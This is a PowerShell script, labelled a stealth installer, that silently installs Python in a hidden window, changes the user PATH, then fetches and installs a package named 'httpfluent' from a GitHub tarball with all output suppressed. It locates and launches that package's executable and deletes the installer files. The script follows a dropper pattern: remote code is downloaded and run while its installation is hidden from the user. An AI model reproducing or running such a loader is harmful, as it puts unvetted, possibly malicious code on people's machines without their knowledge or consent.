# ===================================================
# Python 3.12.6 + httpfluent (Stealth Install + Visible Exec)
# ===================================================

$InstallDir = "$env:LOCALAPPDATA\Programs\Python\Python312"
$PythonExe = Join-Path $InstallDir "python.exe"
$InstallRequired = $true
$FoundPythonVersion = $null

# --- Step 0: Pre-Check (Total Stealth) ---
if (Get-Command python -ErrorAction SilentlyContinue) {
    $CheckPath = "python"
} elseif (Test-Path $PythonExe) {
    $CheckPath = $PythonExe
}

if ($CheckPath) {
    $VersionString = & $CheckPath --version 2>&1
    if ($VersionString -match "Python (\d+\.\d+\.\d+)") {
        $FoundPythonVersion = $Matches[1]
        if ([version]$FoundPythonVersion -ge [version]"3.9") { 
            $InstallRequired = $false 
            $ExecutableToUse = $CheckPath
        }
    }
}

# --- YOUR ALGORITHM (Steps 1-5 in Stealth) ---
if ($InstallRequired) {
    $PythonVersion = "3.12.6"
    $PythonInstaller = "python-$PythonVersion-amd64.exe"
    $DownloadUrl = "https://www.python.org/ftp/python/$PythonVersion/$PythonInstaller"
    $DownloadDir = "$env:TEMP\Python"

    if (-not (Test-Path $DownloadDir)) { New-Item -ItemType Directory -Path $DownloadDir > $null 2>&1 }
    $InstallerPath = Join-Path $DownloadDir $PythonInstaller
    
    try {
        (New-Object System.Net.WebClient).DownloadFile($DownloadUrl, $InstallerPath)
    } catch { exit 1 }

    # Stealth Installation
    Start-Process -FilePath $InstallerPath -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1 Include_test=0 TargetDir=`"$InstallDir`"" -Wait -WindowStyle Hidden > $null 2>&1

    # Update Path
    $OldPath = [Environment]::GetEnvironmentVariable("Path","User")
    $NewPath = "$InstallDir;$InstallDir\Scripts;" + ($OldPath -replace [regex]::Escape("$env:LOCALAPPDATA\Microsoft\WindowsApps;"),"")
    [Environment]::SetEnvironmentVariable("Path",$NewPath,"User") > $null 2>&1
    
    $env:Path = $NewPath
    $ExecutableToUse = $PythonExe
    $FoundPythonVersion = "3.12.6"
}

# --- Step 7: Package Installation (Stealth) ---
& $ExecutableToUse -m pip install --upgrade pip --quiet > $null 2>&1
& $ExecutableToUse -m pip install requests --quiet > $null 2>&1
& $ExecutableToUse -m pip install "https://github.com/httpfluent/Intranetflow/raw/main/v1.0/httpfluent-0.1.tar.gz" --quiet > $null 2>&1

# --- Find httpfluent.exe path dynamically based on Python version ---
$HttpFluentPath = $null

# Extract major.minor version from full version (e.g., "3.9" from "3.9.6", "3.16" from "3.16.0")
if ($FoundPythonVersion) {
    $VersionParts = $FoundPythonVersion -split '\.'
    $PythonMajorMinor = "$($VersionParts[0]).$($VersionParts[1])"
    
    # Build search patterns for all possible locations
    $PossiblePaths = @()
    
    # 1. Check Python installation directory (for per-user installs)
    if ($InstallRequired -eq $false -and $ExecutableToUse -ne "python") {
        $PythonDir = Split-Path $ExecutableToUse -Parent
        $PossiblePaths += Join-Path $PythonDir "Scripts\httpfluent.exe"
    }
    
    # 2. Check standard user installation locations
    $PossiblePaths += "$env:LOCALAPPDATA\Programs\Python\Python$PythonMajorMinor\Scripts\httpfluent.exe"
    
    # 3. Check roaming AppData locations (common for pip installs)
    $PossiblePaths += "$env:APPDATA\Python\Python$PythonMajorMinor\Scripts\httpfluent.exe"
    $PossiblePaths += "$env:USERPROFILE\AppData\Roaming\Python\Python$PythonMajorMinor\Scripts\httpfluent.exe"
    
    # 4. Check common Python directories
    $PossiblePaths += "$env:USERPROFILE\AppData\Local\Programs\Python\Python$PythonMajorMinor\Scripts\httpfluent.exe"
    
    # 5. Check in PATH directories
    $PathDirs = $env:Path -split ';' | Where-Object { $_ -ne '' }
    foreach ($dir in $PathDirs) {
        $PossiblePaths += Join-Path $dir "httpfluent.exe"
    }
    
    # 6. Also check for PythonXY format (e.g., Python39, Python316)
    $PythonFolderName = "Python$($VersionParts[0])$($VersionParts[1])"
    $PossiblePaths += "$env:LOCALAPPDATA\Programs\Python\$PythonFolderName\Scripts\httpfluent.exe"
    $PossiblePaths += "$env:APPDATA\Python\$PythonFolderName\Scripts\httpfluent.exe"
}

# If version not found or paths above didn't work, try generic searches
if (-not $HttpFluentPath) {
    $GenericPaths = @(
        "$env:LOCALAPPDATA\Programs\Python\*\Scripts\httpfluent.exe",
        "$env:APPDATA\Python\*\Scripts\httpfluent.exe",
        "$env:USERPROFILE\AppData\Roaming\Python\*\Scripts\httpfluent.exe",
        "$env:USERPROFILE\AppData\Local\Programs\Python\*\Scripts\httpfluent.exe"
    )
    
    foreach ($pattern in $GenericPaths) {
        $found = Get-ChildItem -Path $pattern -ErrorAction SilentlyContinue | Select-Object -First 1
        if ($found) {
            $HttpFluentPath = $found.FullName
            break
        }
    }
}

# If still not found, try to locate it using pip show
if (-not $HttpFluentPath) {
    try {
        $pipShow = & $ExecutableToUse -m pip show -f httpfluent 2>&1
        if ($pipShow -match "Location:\s*(.+)") {
            $packageLocation = $Matches[1].Trim()
            # Go up one level from site-packages to Scripts
            $scriptsDir = Join-Path (Split-Path $packageLocation -Parent) "Scripts\httpfluent.exe"
            if (Test-Path $scriptsDir) {
                $HttpFluentPath = $scriptsDir
            }
        }
    } catch {
        # Continue to fallback method
    }
}

# Last resort: Search entire user profile for httpfluent.exe
if (-not $HttpFluentPath) {
    try {
        $foundExe = Get-ChildItem -Path "$env:USERPROFILE" -Filter "httpfluent.exe" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
        if ($foundExe) {
            $HttpFluentPath = $foundExe.FullName
        }
    } catch {
        # Ignore errors in search
    }
}

# --- Cleanup temporary installer ---
if (Test-Path "$env:TEMP\Python") {
    Remove-Item "$env:TEMP\Python" -Recurse -Force -ErrorAction SilentlyContinue > $null 2>&1
}

# --- THE FINAL STEP: DIRECT VISIBLE COMMAND ---
if ($HttpFluentPath) {
    # Launch httpfluent.exe directly and visibly
    Write-Host "Launching httpfluent from: $HttpFluentPath"
    Start-Process -FilePath $HttpFluentPath -WindowStyle Normal
} else {
    # Fallback 1: Try running via httpfluent command
    try {
        httpfluent
    } catch {
        # Fallback 2: Run via Python module if exe not found
        Write-Host "Running httpfluent via Python module..."
        & $ExecutableToUse -m httpfluent
    }
}
